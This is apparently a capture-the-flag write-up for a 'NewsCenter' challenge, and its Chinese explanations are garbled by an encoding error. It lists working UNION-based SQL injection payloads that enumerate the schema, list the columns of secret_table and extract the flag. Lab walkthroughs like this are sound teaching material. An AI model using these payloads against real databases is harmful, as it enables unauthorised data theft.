# NewsCenter

## ��һ�⿼����� SQL ע��

 ������ `' and 0 union select 1,2,3 #` �������жϸ�sql��ѯ������������

![](https://img-blog.csdnimg.cn/20190608195547527.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

Ȼ���� `' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #` �õ�������������������Ҫ�õ� `secret_table` ���е�����
![](https://img-blog.csdnimg.cn/20190608195755204.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

���� `' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#` �õ� `secret_table` ��������Լ���������

![](https://img-blog.csdnimg.cn/20190608200218788.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

���Ϳ��Լ򵥴ֱ��صõ�flag

`' and 0 union select 1,2,fl4g from secret_table #`

![](https://img-blog.csdnimg.cn/20190608200423409.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjE1MTYxMQ==,size_16,color_FFFFFF,t_70)

#### ������һ����sqlmapҲ�ܺ������������ѧϰ�Ļ��������Լ��ֲ�һ��ȽϺ�